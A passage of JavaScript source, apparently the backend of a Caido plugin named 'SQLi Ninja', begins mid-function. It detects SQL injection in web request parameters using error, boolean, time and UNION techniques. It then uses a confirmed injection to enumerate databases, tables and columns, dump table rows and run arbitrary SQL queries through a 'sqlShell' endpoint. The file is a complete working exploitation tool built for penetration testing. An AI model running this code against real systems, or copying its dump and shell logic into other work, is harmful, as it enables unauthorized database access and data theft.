              if (verbose) sendLog2(`    [PAYLOAD] ${fullPayload.substring(0, 100)}${fullPayload.length > 100 ? "..." : ""}`, "verbose");
              const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
              if (!resp) continue;
              const injectedEcho = stripEchoes(resp.body, fullPayload, probe);
              const markerHit = !paramReflects && injectedEcho.includes(GH_ERROR_MARKER) && !baselineResp.body.includes(GH_ERROR_MARKER);
              const errConfirm = confirmErrorBased(baselineResp.body, injectedEcho, ghGroupToCode(entry.dbms));
              if (markerHit || errConfirm) {
                const detectedDbms = errConfirm && errConfirm.dbms !== "unknown" ? errConfirm.dbms : ghGroupToCode(entry.dbms) !== "unknown" ? ghGroupToCode(entry.dbms) : confirmedDbms;
                if (detectedDbms !== "unknown") confirmedDbms = detectedDbms;
                const evidence = markerHit ? `ghauri error marker '${GH_ERROR_MARKER}' reflected via injection` : errConfirm.evidence;
                sendLog2(`[+] VULNERABLE! Error-based SQLi confirmed`, "success");
                sendLog2(`    Title: ${entry.title}`, "success");
                sendLog2(`    DBMS: ${detectedDbms}`, "success");
                sendLog2(`    Evidence: ${evidence}`, "success");
                sendLog2(`    Payload: ${fullPayload.substring(0, 80)}...`, "success");
                const finding = {
                  param: param.name,
                  paramType: param.type,
                  technique: "error",
                  dbms: detectedDbms,
                  payload: fullPayload,
                  prefix: pref,
                  suffix: suf,
                  evidence,
                  confidence: "high",
                  title: entry.title
                };
                findings.push(finding);
                recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });
                try {
                  if (originalRequest && sdk.findings && typeof sdk.findings.create === "function") {
                    await sdk.findings.create({
                      title: `SQLi (Error-based) - ${param.name}`,
                      description: `SQL Injection vulnerability found in parameter "${param.name}".

Technique: Error-based
DBMS: ${detectedDbms}
Title: ${entry.title}
Payload: ${fullPayload}

Evidence: ${evidence}`,
                      reporter: "SQLi Ninja",
                      request: originalRequest
                    });
                    sendLog2(`[+] Finding added to Caido Findings tab`, "success");
                  }
                } catch (e) {
                }
                break errDone;
              }
            }
          }
      }
      if (techniques.includes("boolean")) {
        sendLog2(``, "info");
        sendLog2(`[*] Testing BOOLEAN-BASED injection...`, "info");
        boolDone:
          for (const entry of ghCandidates("boolean", confirmedDbms)) {
            const title = entry.title;
            for (const { pref, suf } of ghBoundaries(entry, level)) {
              if (isAborted(sessionId)) break boolDone;
              const truePayloadStr = ghSubst(entry.payload, "true", timeSec, param.value);
              const falsePayloadStr = ghSubst(entry.payload, "false", timeSec, param.value);
              const fullTruePayload = `${param.value}${pref}${truePayloadStr}${suf}`;
              const fullFalsePayload = `${param.value}${pref}${falsePayloadStr}${suf}`;
              if (verbose) {
                sendLog2(`    [TRUE]  ${fullTruePayload.substring(0, 80)}...`, "verbose");
                sendLog2(`    [FALSE] ${fullFalsePayload.substring(0, 80)}...`, "verbose");
              }
              const trueResp = await sendRequest(requestId, param.name, param.type, fullTruePayload, rawRequest, sessionId);
              const falseResp = await sendRequest(requestId, param.name, param.type, fullFalsePayload, rawRequest, sessionId);
              if (!trueResp || !falseResp) continue;
              const simTrueBase = pageSimilarity(baselineResp.body, trueResp.body);
              const simFalseBase = pageSimilarity(baselineResp.body, falseResp.body);
              let boolConfirmed = false;
              let selfSim = 0, sep = 0;
              if (simTrueBase >= 0.9 && simTrueBase - simFalseBase >= 0.15) {
                const true2 = await sendRequest(requestId, param.name, param.type, fullTruePayload, rawRequest, sessionId);
                const false2 = await sendRequest(requestId, param.name, param.type, fullFalsePayload, rawRequest, sessionId);
                selfSim = true2 ? pageSimilarity(trueResp.body, true2.body) : 0;
                const falseSelf = false2 ? pageSimilarity(falseResp.body, false2.body) : 0;
                sep = pageSimilarity(trueResp.body, falseResp.body);
                boolConfirmed = selfSim >= 0.9 && falseSelf >= 0.9 && selfSim - sep >= 0.15;
                if (!boolConfirmed && verbose) {
                  sendLog2(`    [skip] ${param.name}/${title}: not a stable boolean oracle (true-self ${selfSim * 100 | 0}%, true/false ${sep * 100 | 0}%) \u2014 dynamic page / false positive`, "verbose");
                }
              }
              if (boolConfirmed) {
                sendLog2(`[+] VULNERABLE! Boolean-based SQLi confirmed`, "success");
                sendLog2(`    Title: ${title}`, "success");
                sendLog2(`    TRUE reproducible: ${(selfSim * 100).toFixed(1)}%, TRUE vs FALSE differ: ${((1 - sep) * 100).toFixed(1)}%`, "success");
                const finding = {
                  param: param.name,
                  paramType: param.type,
                  technique: "boolean",
                  dbms: confirmedDbms,
                  payload: fullTruePayload,
                  prefix: pref,
                  suffix: suf,
                  evidence: `TRUE self-similarity ${(selfSim * 100).toFixed(1)}%, TRUE vs FALSE ${(sep * 100).toFixed(1)}%`,
                  confidence: "medium",
                  title
                };
                findings.push(finding);
                recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });
                try {
                  if (originalRequest && sdk.findings && typeof sdk.findings.create === "function") {
                    await sdk.findings.create({
                      title: `SQLi (Boolean-based) - ${param.name}`,
                      description: `SQL Injection vulnerability found in parameter "${param.name}".

Technique: Boolean-based
DBMS: ${confirmedDbms}
Title: ${title}

True payload: ${fullTruePayload}
False payload: ${fullFalsePayload}

TRUE self-similarity: ${(selfSim * 100).toFixed(1)}%
TRUE vs FALSE: ${(sep * 100).toFixed(1)}%`,
                      reporter: "SQLi Ninja",
                      request: originalRequest
                    });
                    sendLog2(`[+] Finding added to Caido Findings tab`, "success");
                  }
                } catch (e) {
                }
                break;
              }
            }
            if (findings.some((f) => f.param === param.name && f.technique === "boolean")) break;
          }
      }
      if (techniques.includes("time")) {
        sendLog2(``, "info");
        sendLog2(`[*] Testing TIME-BASED injection (${timeSec}s delay)...`, "info");
        const timeBoundaries = (entry) => entry.comments.slice(0, level === 1 ? 3 : level === 2 ? 6 : 10);
        timeDone:
          for (const entry of ghCandidates("time", confirmedDbms)) {
            const title = entry.title;
            for (const { pref, suf } of timeBoundaries(entry)) {
              if (isAborted(sessionId)) break timeDone;
              const payloadStr = ghSubst(entry.payload, "plain", timeSec, param.value);
              const fullPayload = `${param.value}${pref}${payloadStr}${suf}`;
              if (verbose) sendLog2(`    [PAYLOAD] ${fullPayload.substring(0, 80)}...`, "verbose");
              const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
              if (!resp) continue;
              const expectedDelay = timeSec * 1e3;
              const tolerance = 1500;
              if (resp.time >= expectedDelay - tolerance && resp.time <= expectedDelay + timeSec * 1e3) {
                sendLog2(`    [*] Potential delay detected (${resp.time}ms), confirming...`, "warn");
                const confirmResp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
                if (confirmResp && confirmResp.time >= expectedDelay - tolerance) {
                  const timeDbms = ghGroupToCode(entry.dbms);
                  if (timeDbms !== "unknown") confirmedDbms = timeDbms;
                  sendLog2(`[+] VULNERABLE! Time-based SQLi confirmed`, "success");
                  sendLog2(`    Title: ${title}`, "success");
                  sendLog2(`    DBMS: ${confirmedDbms}`, "success");
                  sendLog2(`    Delay: ${confirmResp.time}ms (expected ~${expectedDelay}ms)`, "success");
                  const finding = {
                    param: param.name,
                    paramType: param.type,
                    technique: "time",
                    dbms: confirmedDbms,
                    payload: fullPayload,
                    prefix: pref,
                    suffix: suf,
                    evidence: `Response delayed by ${confirmResp.time}ms (expected ${expectedDelay}ms)`,
                    confidence: "high",
                    title
                  };
                  findings.push(finding);
                  recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });
                  try {
                    if (originalRequest && sdk.findings && typeof sdk.findings.create === "function") {
                      await sdk.findings.create({
                        title: `SQLi (Time-based) - ${param.name}`,
                        description: `SQL Injection vulnerability found in parameter "${param.name}".

Technique: Time-based blind
DBMS: ${confirmedDbms}
Title: ${title}
Payload: ${fullPayload}

Response delay: ${confirmResp.time}ms (expected ~${expectedDelay}ms)`,
                        reporter: "SQLi Ninja",
                        request: originalRequest
                      });
                      sendLog2(`[+] Finding added to Caido Findings tab`, "success");
                    }
                  } catch (e) {
                  }
                  break timeDone;
                }
              }
            }
          }
      }
      if (techniques.includes("union")) {
        sendLog2(``, "info");
        sendLog2(`[*] Testing UNION-BASED injection...`, "info");
        for (const unionPayload of UNION_PAYLOADS) {
          for (const { pref, suf } of prefixSuffixes.slice(0, level === 1 ? 4 : 8)) {
            if (isAborted(sessionId)) break;
            const fullPayload = `${param.value}${pref}${unionPayload}${suf}`;
            if (verbose) {
              sendLog2(`    [PAYLOAD] ${fullPayload}`, "verbose");
            }
            const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
            if (!resp) continue;
            const nullCount = (unionPayload.match(/NULL/g) || []).length;
            const comparison = compareResponses(baselineResp.body, resp.body);
            if (!comparison.similar && resp.status === 200) {
              const columnMatch = resp.body.match(/NULL/gi);
              sendLog2(`    [*] Response differs with ${nullCount} columns, investigating...`, "info");
              const versionPayload = unionPayload.replace("NULL", heuristicDbms === "mysql" ? "VERSION()" : heuristicDbms === "mssql" ? "@@VERSION" : heuristicDbms === "postgresql" ? "version()" : "NULL");
              const versionFullPayload = `${param.value}${pref}${versionPayload}${suf}`;
              const versionResp = await sendRequest(requestId, param.name, param.type, versionFullPayload, rawRequest, sessionId);
              const versionBody = versionResp ? stripEchoes(versionResp.body, versionFullPayload, versionPayload) : "";
              if (versionResp && versionBody.match(/\d+\.\d+\.\d+|MariaDB|PostgreSQL|Microsoft|Oracle/i)) {
                sendLog2(`[+] VULNERABLE! UNION-based SQLi confirmed`, "success");
                sendLog2(`    Columns: ${nullCount}`, "success");
                const finding = {
                  param: param.name,
                  paramType: param.type,
                  technique: "union",
                  dbms: heuristicDbms,
                  payload: versionFullPayload,
                  prefix: pref,
                  suffix: suf,
                  evidence: `UNION with ${nullCount} columns successful`,
                  confidence: "high",
                  title: `UNION-based (${nullCount} columns)`
                };
                findings.push(finding);
                recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value });
                try {
                  if (originalRequest && sdk.findings && typeof sdk.findings.create === "function") {
                    await sdk.findings.create({
                      title: `SQLi (UNION-based) - ${param.name}`,
                      description: `SQL Injection vulnerability found in parameter "${param.name}".

Technique: UNION-based
DBMS: ${heuristicDbms}
Columns: ${nullCount}
Payload: ${versionFullPayload}`,
                      reporter: "SQLi Ninja",
                      request: originalRequest
                    });
                    sendLog2(`[+] Finding added to Caido Findings tab`, "success");
                  }
                } catch (e) {
                }
                break;
              }
            }
          }
          if (findings.some((f) => f.param === param.name && f.technique === "union")) break;
        }
      }
    }
    sendLog2(``, "info");
    sendLog2(`\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557`, "info");
    sendLog2(`\u2551                      SCAN COMPLETE                           \u2551`, "info");
    sendLog2(`\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D`, "info");
    sendLog2(`[*] Parameters tested: ${params.length}`, "info");
    sendLog2(`[*] Vulnerabilities found: ${findings.length}`, findings.length > 0 ? "success" : "info");
    if (findings.length > 0) {
      sendLog2(``, "info");
      sendLog2(`[+] FINDINGS:`, "success");
      for (const f of findings) {
        sendLog2(`    - ${f.param}: ${f.technique} (${f.dbms}) - ${f.title}`, "success");
      }
    }
    return findings;
  });
  sdk.api.register("getVectors", async (_sdk, requestId) => {
    return Object.values(confirmedVectors).filter((v) => (v.requestId || "") === (requestId || "") || !requestId && v.requestId === "").map((v) => ({ param: v.param, paramType: v.paramType, technique: v.technique, dbms: v.dbms }));
  });
  sdk.api.register("enumerate", async (_sdk, cfg) => {
    const sid = cfg.sessionId || "";
    const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    const rowCap = cfg.rowCap || 50;
    sendLog2(``, "info");
    sendLog2(`[*] Enumerating ${cfg.kind}...`, "info");
    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return [];
    const { v, refs } = prep;
    const dbms = v.dbms && v.dbms !== "unknown" ? v.dbms : "mysql";
    const q = ENUM_QUERIES[dbms] || ENUM_QUERIES.mysql;
    const single = async (sql) => {
      const val = await extractValue(v, `(${sql})`, refs, timeSec, sid);
      sendLog2(`[+] ${cfg.kind}: ${val}`, "success");
      return [val];
    };
    try {
      switch (cfg.kind) {
        case "banner":
          return await single(q.version);
        case "user":
          return await single(q.user || "SELECT USER()");
        case "currentdb":
          return await single(dbms === "mysql" ? "SELECT DATABASE()" : dbms === "mssql" ? "SELECT DB_NAME()" : dbms === "postgresql" ? "SELECT current_database()" : "SELECT USER FROM DUAL");
        case "hostname":
          return await single(q.hostname || "SELECT @@hostname");
        case "dbs": {
          const rows = await extractMultiRow(v, q.databases, refs, timeSec, rowCap, sid);
          sendLog2(`[+] Databases (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        case "tables": {
          const sql = q.tables.replace(/\[DB\]/g, cfg.db || "");
          const rows = await extractMultiRow(v, sql, refs, timeSec, rowCap, sid);
          sendLog2(`[+] Tables in ${cfg.db} (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        case "columns": {
          const sql = q.columns.replace(/\[DB\]/g, cfg.db || "").replace(/\[TABLE\]/g, cfg.table || "");
          const rows = await extractMultiRow(v, sql, refs, timeSec, rowCap, sid);
          sendLog2(`[+] Columns in ${cfg.table} (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        default:
          return [];
      }
    } catch (e) {
      sendLog2(`[!] Enumerate error: ${e?.message || e}`, "error");
      return [];
    }
  });
  sdk.api.register("dump", async (_sdk, cfg) => {
    const sid = cfg.sessionId || "";
    const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    const rowCap = cfg.rowCap || 20;
    const cols = cfg.columns;
    const tableRef = cfg.db ? `${cfg.db}.${cfg.table}` : cfg.table;
    sendLog2(``, "info");
    sendLog2(`[*] Dumping ${cols.join(",")} from ${tableRef} (cap ${rowCap})`, "info");
    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return { columns: cols, rows: [] };
    const { v, refs } = prep;
    const dbms = v.dbms && v.dbms !== "unknown" ? v.dbms : "mysql";
    const sep = String.fromCharCode(127);
    const concatCols = dbms === "mysql" ? `CONCAT_WS(0x7f,${cols.join(",")})` : dbms === "mssql" ? cols.map((c) => `CAST(${c} AS NVARCHAR(MAX))`).join("+CHAR(127)+") : dbms === "postgresql" ? cols.map((c) => `COALESCE(${c}::text,'')`).join("||CHR(127)||") : cols.map((c) => `${c}`).join("||CHR(127)||");
    const baseSql = `SELECT ${concatCols} FROM ${tableRef}`;
    try {
      const rawRows = await extractMultiRow(v, baseSql, refs, timeSec, rowCap, sid);
      const rows = rawRows.map((r) => r.split(sep));
      sendLog2(`[+] Dumped ${rows.length} row(s)`, "success");
      return { columns: cols, rows };
    } catch (e) {
      sendLog2(`[!] Dump error: ${e?.message || e}`, "error");
      return { columns: cols, rows: [] };
    }
  });
  sdk.api.register("sqlShell", async (_sdk, cfg) => {
    const sid = cfg.sessionId || "";
    const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    sendLog2(``, "info");
    sendLog2(`sqli> ${cfg.query}`, "info");
    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return "";
    const { v, refs } = prep;
    try {
      const expr = `(${cfg.query.replace(/;+\s*$/, "")})`;
      const val = await extractValue(v, expr, refs, timeSec, sid);
      sendLog2(`[+] ${val}`, "success");
      return val;
    } catch (e) {
      sendLog2(`[!] SQL shell error: ${e?.message || e}`, "error");
      return "";
    }
  });
}
export {
  init
};
